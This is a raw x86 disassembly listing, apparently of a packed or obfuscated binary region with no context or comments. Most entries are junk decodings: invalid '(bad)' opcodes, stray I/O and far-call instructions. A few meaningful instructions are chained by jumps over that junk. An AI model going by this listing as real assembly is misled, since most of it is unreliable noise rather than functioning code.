  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	lds    ebx,FWORD PTR [edi+0x9c125c5]
  4143ea:	jg     0x414464
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	cmp    dh,BYTE PTR [edx+0x1ea24a42]
  4143f6:	push   ss
  4143f7:	pusha  
  4143f8:	not    BYTE PTR [ecx]
  4143fa:	ror    esp,0x31
  4143fd:	or     esp,DWORD PTR [edi+0x71]
  414400:	and    eax,0xcf4a96d1
  414405:	(bad)  
  414406:	call   0xf4bc:0x246a2932
  41440d:	aam    0x48
  41440f:	push   cs
  414410:	lds    eax,FWORD PTR [ecx]
  414412:	dec    eax
  414413:	mov    dh,0x18
  414415:	and    dl,0x6a
  414418:	into   
  414419:	mov    ebp,0xa6f073a2
  41441e:	adc    DWORD PTR [esi*8+0x2d7821ce],0x3c34437c
  414429:	(bad)  
  41442b:	lock xor eax,0x3f7d0eb5
  414431:	add    eax,DWORD PTR [ebx]
  414433:	sbb    al,0x29
  414435:	adc    cl,BYTE PTR [eax-0x44]
  414438:	cli    
  414439:	add    bl,bh
  41443b:	div    DWORD PTR ds:0x775695ec
  414441:	or     eax,0x7e7c794b
  414446:	sti    
  414447:	fwait
  414448:	sar    BYTE PTR ds:0x6d3c6d6,1
  41444e:	outs   dx,DWORD PTR ds:[esi]
  41444f:	pop    ebx
  414450:	jnp    0x4143e4
  414452:	push   ebx
  414453:	mov    eax,0x777e3c7a
  414458:	sub    al,0xd7
  41445a:	cdq    
  41445b:	loope  0x4144c5
  41445d:	mov    BYTE PTR [ecx-0x6552d505],dl
  414463:	and    bh,BYTE PTR [eax+0x33]
  414466:	xchg   eax,ebp
  414468:	imul   esp,DWORD PTR [esp+edx*4-0xa],0xffffffff
  41446d:	xor    BYTE PTR [ecx-0x3681c99d],ch
  414473:	inc    esi
  414474:	cmp    cl,al
  414476:	(bad)  
  414477:	xchg   ebx,eax
  414478:	jmp    0x48828d86
  41447d:	xchg   edx,eax
  41447e:	inc    esp
  41447f:	ret    0x922d
  414482:	add    al,0xd5
  414484:	jmp    0x41442a
  414486:	fcmovu st,st(2)
  414488:	and    esi,DWORD PTR [edx-0x17a00f38]
  41448e:	scas   al,BYTE PTR es:[edi]
  41448f:	xor    eax,DWORD PTR [esi]
  414491:	inc    BYTE PTR [ebp-0x2d]
  414494:	pop    esp
  414495:	push   eax
  414496:	sub    DWORD PTR [esi-0x397ac83],ebp
  41449c:	je     0x414421
  41449e:	lods   al,BYTE PTR ds:[esi]
  41449f:	and    eax,0x8623efdb
  4144a4:	loopne 0x414430
  4144a6:	ja     0x41451b
  4144a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144a9:	iret   
  4144aa:	jmp    0xb9cf8940
  4144af:	pop    ebx
  4144b0:	scas   al,BYTE PTR es:[edi]
  4144b1:	jbe    0x41448f
  4144b3:	or     esi,DWORD PTR [ebp-0x4c]
  4144b6:	leave  
  4144b7:	cmp    edx,DWORD PTR es:[ebx]
  4144ba:	mov    eax,ds:0xa36dc844
  4144bf:	gs mov dh,0x15
  4144c2:	dec    edi
  4144c3:	arpl   WORD PTR [ebp+0x56ecbef7],dx
  4144c9:	and    esp,ecx
  4144cb:	or     dh,bh
  4144cd:	rcl    BYTE PTR [ebp+0x36],cl
  4144d0:	imul   esp,ebp,0xff31e7db
  4144d6:	les    edi,FWORD PTR [edi-0x4cf66541]
  4144dc:	mov    eax,ebx
  4144de:	jmp    0xb6544d51
  4144e3:	push   ecx
  4144e4:	rol    DWORD PTR [edi-0x4f],0x77
  4144e8:	and    edi,eax
  4144ea:	mov    ch,0x69
  4144ec:	imul   edx,DWORD PTR [edi-0x16],0x43
  4144f0:	bnd jo 0x41447a
  4144f3:	je     0x4144d5
  4144f5:	xchg   ebx,eax
  4144f6:	hlt    
  4144f7:	add    eax,0x7878383f
  4144fc:	adc    bh,ah
  4144fe:	in     al,0xc3
  414500:	and    eax,0xcc2dcada
  414505:	fwait
  414506:	jp     0x41456d
  414508:	loope  0x41454e
  41450a:	shl    DWORD PTR [eax-0x53],1
  41450d:	mov    dh,0x72
  41450f:	dec    esp
  414510:	pop    ebp
  414511:	or     ecx,DWORD PTR [ebx-0x5814d6b3]
  414517:	lahf   
  414518:	or     BYTE PTR [esi],0xf1
  41451b:	test   eax,0x6e6c6bb7
  414520:	inc    esp
  414521:	cdq    
  414522:	dec    eax
  414523:	jmp    FWORD PTR [eax]
  414525:	retf   0x1baf
  414528:	adc    DWORD PTR [ebx-0x2],ebx
  41452b:	ret    
  41452c:	iret   
  41452d:	inc    ecx
  41452e:	jns    0x41459d
  414530:	ins    BYTE PTR es:[edi],dx
  414531:	shl    DWORD PTR [ebx+0x15],1
  414534:	xchg   ecx,eax
  414535:	lahf   
  414536:	dec    ecx
  414537:	push   0xffffffcc
  414539:	mov    ecx,0x73d0548e
  41453e:	dec    ebx
  41453f:	ror    DWORD PTR [edx],1
  414541:	imul   ecx,DWORD PTR [edi+0x19653022],0x14
  414548:	inc    eax
  414549:	add    cl,BYTE PTR [ecx+0x4f903fdb]
  41454f:	lds    ebp,FWORD PTR [esi-0x2f]
  414552:	test   BYTE PTR [ebp-0x286cc2be],ch
  414558:	arpl   WORD PTR [ebx-0x4ba6ecc4],cx
  41455e:	mov    ds:0xb9c9b728,ax
  414564:	pop    es
  414565:	cs push edx
  414567:	sar    DWORD PTR [ebx],cl
  414569:	xor    dl,0xb8
  41456c:	xor    dl,BYTE PTR [edx+eax*1-0x5f]
  414570:	aas    
  414571:	dec    ebx
  414572:	aas    
  414573:	out    dx,eax
  414574:	pop    ecx
  414575:	mov    edx,0x45e61d76
  41457a:	cmc    
  41457b:	mov    al,ds:0x11a8d92c
  414580:	loope  0x414543
  414582:	popf   
  414583:	mov    al,ds:0xce8aff46
  414588:	xchg   edx,eax
  414589:	cmc    
  41458a:	enter  0x55d6,0x94
  41458e:	cmp    al,0x29
  414590:	(bad)  
  414591:	aad    0x3d
  414593:	jg     0x4145a2
  414595:	loope  0x41460d
  414597:	(bad)  
  414599:	sub    edx,0xffffffbc
  41459c:	(bad)  
  41459e:	fs push 0x93ba29aa
  4145a4:	push   esp
  4145a5:	mov    ds:0x13d32722,eax
  4145aa:	out    0x36,al
  4145ac:	sbb    al,BYTE PTR [ebx+eiz*1]
  4145af:	sar    DWORD PTR [edi+0x73],cl
  4145b2:	arpl   cx,di
  4145b4:	(bad)  
  4145b5:	out    dx,eax
  4145b6:	xchg   esi,eax
  4145b7:	mov    esi,0x23dbefc4
  4145bc:	lahf   
  4145bd:	push   ds
  4145be:	dec    ebp
  4145bf:	in     al,0xc0
  4145c1:	test   BYTE PTR gs:[eax],ah
  4145c4:	in     al,0xc6
  4145c6:	loop   0x41463c
  4145c8:	add    eax,0xe59b23a6
  4145cd:	scas   eax,DWORD PTR es:[edi]
  4145ce:	xlat   BYTE PTR cs:[ebx]
  4145d0:	jle    0x414562
  4145d2:	(bad)  
  4145d3:	out    0xb2,al
  4145d5:	push   0x99f8549e
  4145da:	repnz popf 
  4145dc:	scas   eax,DWORD PTR es:[edi]
  4145dd:	mov    esi,0xb54ae814
  4145e2:	cmp    al,0x90
  4145e4:	inc    edx
  4145e5:	fcom   DWORD PTR [edi]
  4145e7:	mov    bh,0xe3
  4145e9:	outs   dx,BYTE PTR ds:[esi]
  4145ea:	repnz clc 
  4145ec:	ja     0x41464b
  4145ee:	sub    ah,BYTE PTR [esi]
  4145f0:	xchg   esp,eax
  4145f1:	mov    ah,0x8e
  4145f3:	sbb    BYTE PTR [ecx-0x1a],dh
  4145f6:	inc    esp
  4145f7:	out    dx,eax
  4145f8:	test   BYTE PTR [ecx+0x43],al
  4145fb:	or     eax,0x81c08331
  414600:	fsub   QWORD PTR [ecx-0x6d4a66f6]
  414606:	sbb    eax,0x845d8635
  41460b:	mov    bh,0x9e
  41460d:	adc    eax,0x78314e65
  414612:	jp     0x41459e
  414614:	lock lods eax,DWORD PTR ds:[esi]
  414616:	xor    DWORD PTR [ecx-0x5236e0bd],0xffffffa2
  41461d:	and    DWORD PTR [ecx],edi
  41461f:	sti    
  414620:	out    0x56,al
  414622:	adc    eax,0xe4d17a02
  414627:	data16 add al,0x12
  41462a:	xor    al,BYTE PTR [edi+0x7cb81a29]
  414630:	fst    st(7)
  414632:	adc    ebp,DWORD PTR [esi-0x52f669ed]
  414638:	xchg   edi,eax
  414639:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41463a:	add    eax,0x8d8ee36c
  41463f:	sbb    ecx,DWORD PTR [ebx+0x28]
  414642:	pop    esi
  414643:	sub    ebp,DWORD PTR [eax+ebx*8]
  414646:	mov    eax,0x7b385415
  41464b:	mov    dh,0xf7
  41464d:	imul   esi,DWORD PTR [ebx-0x6c2ed8e9],0x74
  414654:	leave  
  414655:	mov    esi,0x21a073a2
  41465a:	inc    esp
  41465b:	imul   edx,edi
  41465e:	mov    edi,DWORD PTR [ebp-0x18]
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	sub    BYTE PTR [esi],0x8a
  414674:	sahf   
  414675:	cs scas al,BYTE PTR es:[edi]
  414677:	movq   QWORD PTR [eax-0x1b],mm7
  41467b:	jle    0x4146f5
  41467d:	js     0x41465f
  41467f:	jno    0x4146ec
  414681:	inc    edi
  414682:	jg     0x414643
  414684:	(bad)  
  414685:	mov    ah,0xb2
  414687:	aam    0x9d
  414689:	jg     0x4146c5
  41468b:	les    ecx,FWORD PTR [esi]
  41468d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41468e:	call   DWORD PTR [eax+0xaa33e07]
  414694:	popf   
  414695:	cmp    ch,BYTE PTR [edx]
  414697:	ret    
  414698:	push   ebp
  414699:	or     BYTE PTR [ecx-0x22],cl
  41469c:	lock push ss
  41469e:	mov    edi,0xfd376925
  4146a3:	into   
  4146a4:	aam    0xf5
  4146a6:	xchg   esi,eax
  4146a7:	push   ebp
  4146a8:	dec    esi
  4146a9:	sti    
  4146aa:	xchg   ecx,eax
  4146ab:	sti    
  4146ac:	call   DWORD PTR [eax]
  4146ae:	cmp    ebx,ecx
  4146b0:	popa   
  4146b1:	shr    BYTE PTR [edx-0x20],1
  4146b4:	xor    al,0x27
  4146b6:	sbb    ebx,esp
  4146b8:	mov    ss,esi
  4146ba:	push   esp
  4146bb:	add    al,BYTE PTR [edi]
  4146bd:	mov    dh,0x61
  4146bf:	pop    ds
  4146c0:	push   0xf6404baa
  4146c5:	fist   WORD PTR [ebp-0x24]
  4146c8:	nop
  4146c9:	xchg   edi,eax
  4146ca:	test   eax,0xb35b41ef
  4146cf:	inc    esi
  4146d0:	neg    DWORD PTR [ecx-0x27]
  4146d3:	or     eax,0x101c3df4
  4146d8:	jp     0x4146da
  4146da:	popf   
  4146db:	mov    al,ds:0x7ec81feb
  4146e0:	adc    BYTE PTR [edx],al
  4146e2:	xor    BYTE PTR [eax+0x8],ch
  4146e5:	mov    bh,0x5c
  4146e7:	xchg   BYTE PTR [ebx+ecx*1-0xf],al
  4146eb:	push   esp
  4146ec:	xor    DWORD PTR [ecx+0x48269b59],0x7a2c8042
  4146f6:	push   0x89ee195a
  4146fb:	sbb    BYTE PTR [ebx+ebp*2-0x25d51ec],0xee
  414703:	adc    al,0xfb
  414705:	into   
  414706:	mov    DWORD PTR [edx-0x30],esi
  414709:	sar    BYTE PTR [edx-0x14c24209],cl
  41470f:	stc    
  414710:	in     al,0x27
  414712:	in     eax,dx
  414713:	jno    0x4146ac
  414715:	mov    esi,0xd8ac8d31
  41471a:	outs   dx,BYTE PTR ds:[esi]
  41471b:	sbb    ah,BYTE PTR [ebp+0x7db23a50]
  414721:	std    
  414722:	inc    edx
  414723:	sub    al,0x8
  414725:	dec    ecx
  414726:	add    eax,0xdccece6d
  41472b:	adc    DWORD PTR [ecx-0x6512b8ea],eax
  414731:	imul   edi,DWORD PTR [edi-0x34],0x3e
  414735:	jbe    0x414732
  414737:	mov    ebx,0x126529bc
  41473c:	or     cl,BYTE PTR [eax+0x61]
  41473f:	mov    ecx,esp
  414741:	push   0xffffffe4
  414743:	jae    0x41472d
  414745:	jmp    0x41471b
  414747:	pop    ebp
  414748:	mov    bl,BYTE PTR [eax-0x1efb3d]
  41474e:	pop    edi
  41474f:	mov    cl,0x32
  414751:	cmp    eax,0x70fcdcec
  414756:	arpl   WORD PTR [edi-0x63],cx
  414759:	daa    
  41475a:	or     al,al
  41475c:	fidiv  WORD PTR ds:0x653cfa83
  414762:	jge    0x4147c9
  414764:	fucomp st(4)
  414766:	or     eax,0x3d1ed817
  41476b:	inc    eax
  41476c:	inc    ebp
  41476d:	push   edx
  41476e:	inc    eax
  41476f:	aad    0x7a
  414771:	jnp    0x41477b
  414773:	dec    esi
  414774:	xchg   DWORD PTR [esi+eiz*4+0x4d62d768],eax
  41477b:	inc    ebp
  41477c:	ins    BYTE PTR es:[edi],dx
  41477d:	popf   
  41477e:	(bad)  
  414780:	push   cs
  414781:	fcom   DWORD PTR [esi+edx*4-0x18c2cfc6]
  414788:	push   eax
  414789:	mov    BYTE PTR [ebx+0x75],ch
  41478c:	ret    0x1114
  41478f:	cmp    al,0x54
  414792:	ror    BYTE PTR [edi+0x9ef50cc],0x62
  414799:	xor    BYTE PTR [edx+eiz*2-0x53],bh
  41479d:	das    
  41479e:	fadd   DWORD PTR [edi]
  4147a0:	arpl   WORD PTR [eax-0x2c],sp
  4147a3:	cdq    
  4147a4:	push   ss
  4147a5:	cld    
  4147a6:	iret   
  4147a7:	sbb    BYTE PTR [eax],cl
  4147a9:	pop    eax
  4147aa:	dec    esi
  4147ab:	mov    ds:0x75f611d7,al
  4147b1:	leave  
  4147b2:	sar    DWORD PTR [eax+0x60],1
  4147b5:	retf   
  4147b6:	lds    edx,FWORD PTR [edx+0x6ff8639e]
  4147bc:	xchg   ebx,eax
  4147bd:	imul   ebx,DWORD PTR [edi],0x5c3fb866
  4147c3:	outs   dx,BYTE PTR ds:[esi]
  4147c4:	jne    0x4147b2
  4147c6:	jge    0x41474d
  4147c8:	mov    eax,0x867bd560
  4147cd:	repnz out 0x11,eax
  4147d0:	pop    esi
  4147d1:	in     eax,dx
  4147d2:	and    ch,BYTE PTR [eax]
  4147d4:	loopne 0x414802
  4147d6:	sbb    dh,BYTE PTR [edx]
  4147d8:	outs   dx,BYTE PTR ds:[esi]
  4147d9:	fimul  DWORD PTR [esi+0x1532267c]
  4147df:	jge    0x4147b7
  4147e1:	ds jo  0x4147e5
  4147e4:	jecxz  0x4147ed
  4147e6:	mov    cl,0x74
  4147e8:	data16 (bad) 
  4147ea:	fldcw  WORD PTR [edx-0x26]
  4147ed:	mov    ds:0xb7e418a2,al
  4147f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4147f3:	test   al,0x82
  4147f5:	fadd   QWORD PTR [ecx-0x6e00a3b8]
  4147fb:	stos   BYTE PTR es:[edi],al
  4147fc:	mov    ah,0xd7
  4147fe:	cwde   
  4147ff:	cmp    BYTE PTR [eax-0x2e948199],dh
  414805:	mov    BYTE PTR [eax],ah
  414807:	icebp  
  414808:	sbb    eax,0xaf7f545c
  41480d:	jmp    0x46480864
  414812:	cmp    cl,al
  414814:	stc    
  414815:	cmp    eax,0x15d33cdf
  41481a:	xor    al,0xb4
  41481c:	dec    esi
  41481d:	push   ds
  41481e:	cmp    BYTE PTR [esi-0x51],dl
  414821:	add    edi,esi
  414823:	repz shl BYTE PTR [bx+0x5606],1
  414829:	add    al,0x9
  41482b:	xchg   esp,eax
  41482c:	loopne 0x4148ab
  41482e:	out    0xc7,al
  414830:	fld    TBYTE PTR ds:0x547a3ecb
  414836:	jmp    0x414858
  414838:	push   0x55
  41483a:	bndstx [edx],bnd0
  41483d:	retf   0xb4d0
  414840:	inc    edi
  414841:	xchg   bl,cl
  414843:	aaa    
  414844:	or     al,0xf
  414846:	lods   eax,DWORD PTR ds:[esi]
  414847:	adc    al,0x10
  414849:	pop    esp
  41484a:	dec    edi
  41484b:	push   es
  41484c:	ins    DWORD PTR es:[edi],dx
  41484d:	mov    edx,0x49f6812d
  414852:	bound  eax,QWORD PTR [ebx-0x48]
  414855:	aad    0x3d
  414857:	mov    ebp,0x93602494
  41485c:	mov    dl,0xac
  41485e:	pop    esp
  41485f:	sbb    BYTE PTR [eax-0x6e],bl
  414862:	rcr    BYTE PTR [eax+eiz*8-0x5a],cl
  414866:	pop    eax
  414867:	in     al,0xb
  414869:	mov    dh,0xe0
  41486b:	hlt    
  41486c:	adc    cl,BYTE PTR [edx]
  41486e:	int3   
  41486f:	popa   
  414870:	call   0x39ff:0xd3d1108a
  414877:	push   es
  414878:	ds dec ecx
  41487a:	lods   al,BYTE PTR ds:[esi]
  41487b:	cmp    eax,0xa5085b30
  414880:	int    0x5c
  414882:	(bad)  
  414883:	(bad)  
  414884:	push   0xf5cc8b0e
  414889:	sub    ecx,DWORD PTR [eax-0x343a6d52]
  41488f:	or     al,0x3f
  414891:	add    al,0x65
  414893:	push   esi
  414894:	lock ss stos BYTE PTR es:[edi],al
  414897:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  414899:	scas   eax,DWORD PTR es:[edi]
  41489a:	dec    esp
  41489b:	scas   eax,DWORD PTR es:[edi]
  41489c:	inc    ebp
  41489d:	test   al,0x56
  41489f:	pop    ebx
  4148a0:	cmc    
  4148a1:	outs   dx,BYTE PTR ds:[esi]
  4148a2:	aaa    
  4148a3:	pop    ecx
  4148a4:	and    bh,BYTE PTR [eax]
  4148a6:	cmp    ah,BYTE PTR [eax]
  4148a8:	mov    esi,0xe7cced3f
  4148ad:	mov    ebp,0x1206b621
  4148b2:	es pop esi
  4148b4:	inc    ebx
  4148b5:	pop    eax
  4148b6:	mov    ch,0x4
  4148b8:	ds push ecx
  4148ba:	xchg   DWORD PTR [esi],eax
  4148bc:	adc    ch,dh
  4148be:	xor    DWORD PTR [edx+0x78],0xffffff9b
  4148c2:	xchg   ebp,eax
  4148c3:	xchg   DWORD PTR [ecx+0x14],edi
  4148c6:	push   0xffffffbb
  4148c8:	call   0x5ab7:0xcc2d9342
  4148cf:	push   es
  4148d0:	cmc    
  4148d1:	fst    DWORD PTR [ebx+0x9]
  4148d4:	jno    0x4148b1
  4148d6:	mov    ebp,0xfcfb91e5
  4148db:	popa   
  4148dc:	imul   BYTE PTR [edx+0x397f7b57]
  4148e2:	xor    al,0x3c
  4148e4:	test   DWORD PTR [ecx+eiz*8-0x18],0x3f83342
  4148ec:	xlat   BYTE PTR ds:[ebx]
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax+0x6827854b]
  414921:	ins    BYTE PTR es:[edi],dx
  414922:	xchg   ebx,eax
  414923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414924:	sbb    ecx,DWORD PTR [edi+edi*2]
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x4149ac
  41492d:	or     bh,ch
  41492f:	jl     0x4149a1
  414931:	mov    edi,0xe6bbb62c
  414936:	dec    ecx
  414937:	iret   
  414938:	pop    ebx
  414939:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41493a:	or     ebp,esp
  41493c:	out    dx,eax
  41493d:	clc    
  41493e:	in     eax,dx
  41493f:	sar    esi,cl
  414941:	inc    edx
  414942:	cwde   
  414943:	(bad)  
  414944:	and    DWORD PTR ds:0xeb4f845f,esi
  41494a:	mov    ebp,0x6ed6b53f
  41494f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414950:	les    ebp,FWORD PTR [ecx]
  414952:	ret    0x5809
  414955:	mov    esp,0xd68917cb
  41495a:	bswap  esp
  41495c:	and    dl,al
  41495e:	ins    DWORD PTR es:[edi],dx
  41495f:	stos   BYTE PTR es:[edi],al
  414960:	or     eax,0xc0c1c063
  414965:	ss dec esi
  414967:	std    
  414968:	xchg   ecx,eax
  414969:	iret   
  41496a:	(bad)
  41496d:	pop    edi
  41496f:	mov    ebp,DWORD PTR [eax+0x36a7f1fe]
  414975:	xchg   BYTE PTR [ebx],ah
  414977:	dec    esi
  414978:	jns    0x414909
  41497a:	inc    ebp
  41497b:	mov    eax,0xd4dd131d
  414980:	and    al,0xe7
  414982:	sub    bh,BYTE PTR [edi]
  414984:	cli    
  414985:	sbb    al,0xbb
  414987:	sub    al,0x8d
  414989:	pushf  
  41498a:	push   ebx
  41498b:	sub    esi,esi
  41498d:	scas   eax,DWORD PTR es:[edi]
  41498e:	addr16 ret 
  414990:	or     al,0x97
  414992:	retf   
  414993:	je     0x4149f3
  414995:	aas    
  414996:	jnp    0x4149a3
  414998:	icebp  
  414999:	sti    
  41499a:	sub    cl,al
  41499c:	ds out dx,al
  41499e:	(bad)  
  41499f:	cmc    
  4149a0:	icebp  
  4149a1:	or     eax,0x5438de2a
  4149a6:	and    dl,al
  4149a8:	(bad)  
  4149a9:	not    DWORD PTR [ebx-0x1fe95e5e]
  4149af:	or     al,0x54
  4149b1:	inc    edi
  4149b2:	out    dx,al
  4149b3:	sub    al,0xd
  4149b5:	push   es
  4149b6:	add    ebp,eax
  4149b8:	aad    0x9e
  4149ba:	or     dh,BYTE PTR [ecx-0x1a]
  4149bd:	std    
  4149be:	and    al,0xcf
  4149c0:	pop    ss
  4149c1:	xor    BYTE PTR [eax],ah
  4149c3:	sub    ah,dh
  4149c5:	icebp  
  4149c6:	pop    ecx
  4149c7:	leave  
  4149c8:	mov    edx,0x419b9a11
  4149cd:	sub    esi,ebx
  4149cf:	lods   eax,DWORD PTR ds:[esi]
  4149d0:	les    edi,FWORD PTR [ebx]
  4149d2:	je     0x414a28
  4149d4:	mov    dh,bl
  4149d6:	(bad)  
  4149d7:	in     al,0xe2
  4149d9:	sub    al,0x10
  4149db:	mov    dh,0xb2
  4149dd:	jns    0x414a42
  4149df:	mov    esp,0xcf3fc48d
  4149e4:	fild   WORD PTR [esi]
  4149e6:	push   eax
  4149e7:	nop
  4149e8:	fcomp  QWORD PTR [ecx+eax*2-0x26]
  4149ec:	shl    ah,1
  4149ee:	sub    al,0xed
  4149f0:	test   DWORD PTR [ecx],ecx
  4149f2:	add    esi,edx
  4149f4:	aam    0x19
  4149f6:	inc    esp
  4149f7:	out    0xef,eax
  4149f9:	cmp    dh,BYTE PTR [esp+edx*8+0x25]
  4149fd:	add    BYTE PTR [edi],cl
  4149ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a00:	stc    
  414a01:	pop    esi
  414a02:	xchg   esp,esp
  414a04:	leave  
  414a05:	sbb    al,0x80
  414a07:	jp     0x414a3b
  414a09:	pusha  
  414a0a:	shl    BYTE PTR [ebx],1
  414a0c:	mov    eax,0x20ff5a2e
  414a11:	call   0x7881:0xe463bbdd
  414a18:	psubsw mm4,QWORD PTR [edi-0x554eb80d]
  414a1f:	adc    eax,0xdb19f753
  414a24:	jae    0x414aa2
  414a26:	mov    esp,ebp
  414a28:	aad    0xa2
  414a2a:	test   edi,esp
  414a2c:	retf   
  414a2d:	ss daa 
  414a2f:	mov    ds:0x66653ae3,al
  414a34:	int    0xaa
  414a36:	sar    eax,cl
  414a38:	je     0x414a55
  414a3a:	cmp    eax,0xc6c26f20
  414a3f:	icebp  
  414a40:	or     dh,BYTE PTR [ecx+ebx*4+0x1745e5c7]
  414a47:	popa   
  414a48:	adc    DWORD PTR [ebp+0x3f],ebx
  414a4b:	test   eax,0xea7a8442
  414a50:	xchg   esp,eax
  414a51:	das    
  414a52:	out    dx,al
  414a53:	xchg   edi,eax
  414a54:	je     0x414abe
  414a56:	mov    edx,0x4a66c6e4
  414a5b:	enter  0x8797,0x18
  414a5f:	fs mov ebx,0x64f6ad3c
  414a65:	sti    
  414a66:	(bad)  
  414a67:	adc    DWORD PTR [esi-0x77],eax
  414a6a:	or     edi,ecx
  414a6c:	lods   al,BYTE PTR ds:[esi]
  414a6d:	mov    edx,0x99bcbe29
  414a72:	repz cs push esi
  414a75:	ret    
  414a76:	sub    esp,ebp
  414a78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a79:	mov    ebp,ss
  414a7b:	cwde   
  414a7c:	out    dx,al
  414a7d:	daa    
  414a7e:	mov    eax,0x3346e0fc
  414a83:	mov    edi,0xf207c3e1
  414a88:	loop   0x414aa5
  414a8a:	std    
  414a8b:	adc    DWORD PTR [edx],esi
  414a8d:	xchg   ecx,eax
  414a8e:	dec    ebp
  414a8f:	sub    eax,0xc9c2eff7
  414a94:	popa   
  414a95:	cmc    
  414a96:	mov    al,0xa1
  414a98:	sbb    eax,0xe7bf99ea
  414a9d:	test   DWORD PTR [edx-0x56],esp
  414aa0:	loopne 0x414b06
  414aa2:	and    BYTE PTR ds:0xf79e8ffc,bl
  414aa8:	lds    edx,FWORD PTR [esi-0x1bd9f079]
  414aae:	pusha  
  414aaf:	push   eax
  414ab0:	mov    al,0xd6
  414ab2:	mov    edx,0x7e27b383
  414ab7:	pop    esi
  414ab8:	mov    DWORD PTR [edi-0x24],0x29a4f489
  414abf:	sub    BYTE PTR [esi-0x6e],ch
  414ac2:	jge    0x414aba
  414ac4:	jecxz  0x414a48
  414ac6:	adc    edi,ebx
  414ac8:	pusha  
  414ac9:	sbb    BYTE PTR [ebx+0xcc50c3],al
  414acf:	dec    esp
  414ad0:	jae    0x414af9
  414ad2:	adc    al,0x2d
  414ad4:	dec    eax
  414ad5:	jo     0x414a72
  414ad7:	retf   
  414ad8:	or     DWORD PTR [esi],eax
  414ada:	inc    ebx
  414adb:	mov    ebx,0x43c2fe3f
  414ae0:	enter  0x2b93,0xbb
  414ae4:	jp     0x414b43
  414ae6:	dec    esi
  414ae7:	call   0xce1068a2
  414aec:	push   ebx
  414aed:	jbe    0x414b48
  414aef:	(bad)  
  414af0:	out    0x9f,al
  414af2:	or     dh,BYTE PTR [esi]
  414af4:	jmp    0x1e07:0xb8bd1959
  414afb:	push   ebp
  414afc:	add    BYTE PTR [edi+0x35b7b048],ch
  414b02:	je     0x414aae
  414b04:	jo     0x414ac9
  414b06:	lea    edi,[ecx-0x36]
  414b09:	mov    bh,al
  414b0b:	xor    ch,BYTE PTR [esi+esi*4-0x18]
  414b0f:	cli    
  414b10:	mov    esp,0xe41c26cc
  414b15:	adc    al,0x4b
  414b17:	jbe    0x414adf
  414b19:	and    ebp,DWORD PTR [ecx+0x1f]
  414b1c:	scas   eax,DWORD PTR es:[edi]
  414b1d:	inc    eax
  414b1e:	loope  0x414b51
  414b20:	ins    DWORD PTR es:[edi],dx
  414b21:	adc    eax,0x7bdd8d62
  414b26:	and    esi,ecx
  414b28:	mov    ds:0x555d9b07,eax
  414b2d:	pop    esi
  414b2e:	inc    edx
  414b2f:	jle    0x414ab8
  414b31:	iret   
  414b32:	mov    eax,0x2105235e
  414b37:	(bad)  
  414b38:	repnz and ah,0x8f
  414b3c:	jb     0x414bb9
  414b3e:	xor    cl,bl
  414b40:	xchg   edi,eax
  414b41:	mov    bl,0x35
  414b43:	pushf  
  414b44:	mov    ah,0x4d
  414b46:	dec    ebx
  414b47:	xor    bl,dh
  414b49:	or     eax,0xbf09fe32
  414b4e:	dec    esp
  414b4f:	pop    esp
  414b50:	pushf  
  414b51:	mov    al,ds:0x98d54cd5
  414b56:	stc    
  414b57:	mov    cs,WORD PTR [ebp-0x208cdcfd]
  414b5d:	lods   al,BYTE PTR ds:[esi]
  414b5e:	(bad)  
  414b5f:	int3   
  414b60:	pop    es
  414b61:	cli    
  414b62:	dec    edx
  414b63:	fwait
  414b64:	(bad)  
  414b65:	aad    0xb6
  414b67:	sub    BYTE PTR [ecx+0x1e],bh
  414b6a:	push   ss
  414b6b:	sbb    eax,0xde3dea3f
  414b70:	into   
  414b71:	or     BYTE PTR [edi],bl
  414b73:	mov    ds:0xefa595b4,al
  414b78:	or     BYTE PTR [ebx+ebp*4],dh
  414b7b:	sub    DWORD PTR [esi-0x1a9e4c1c],eax
  414b81:	and    BYTE PTR [ecx+0x6b],ah
  414b84:	(bad)  
  414b86:	push   eax
  414b87:	pop    es
  414b88:	es adc ch,ah
  414b8b:	fs mov esi,0x6a740d11
  414b91:	xchg   esi,eax
  414b92:	out    dx,eax
  414b93:	add    al,0xa5
  414b95:	or     dl,BYTE PTR [ebp-0x2efc2fcd]
  414b9b:	imul   edx,ebx
  414b9e:	cmp    edx,edi
  414ba0:	jmp    0x414e28
  414ba5:	int    0xc1
  414ba7:	cmp    al,0xca
  414ba9:	int3   
  414baa:	leave  
  414bab:	aad    0xd9
  414bad:	xchg   esp,eax
  414bae:	mov    ch,0x6d
  414bb0:	dec    edx
  414bb1:	loop   0x414bf4
  414bb3:	push   eax
  414bb4:	push   0xffffff80
  414bb6:	adc    bh,BYTE PTR [edi+0x78]
  414bb9:	in     eax,0x7e
